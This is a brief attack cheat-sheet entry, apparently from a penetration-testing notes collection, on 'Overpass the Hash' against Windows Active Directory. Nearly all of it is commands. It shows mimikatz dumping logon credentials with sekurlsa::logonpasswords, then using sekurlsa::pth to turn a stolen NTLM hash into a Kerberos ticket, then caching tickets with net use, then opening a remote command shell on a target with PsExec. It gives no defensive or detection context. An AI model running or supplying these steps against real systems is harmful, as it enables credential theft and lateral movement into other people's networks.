User NTLM hash can be used to create a Ticket Granting Ticket (TGT) which can then be used to make a Ticket Granting Service (TGS).

On mimikatz, do the following:
```
privilege::debug
```
Note the hash of the user to Overpass the Hash:
```
sekurlsa::logonpasswords
```
```
sekurlsa::pth /user:$(USERNAME) /domain:$(DOMAIN) /ntlm:$(NTLM_HASH) /run:powershell
```
At this point, running the whoami command on the newly created PowerShell session would show the old identity instead of the new user. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets.

To ensure kerberos tickets are cached, run the following:
```batch
net use \\$(HOSTNAME)
```

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). Here we will use PsExec.
```powershell
.\PsExec.exe \\$(HOSTNAME_OF_TARGET) cmd
```
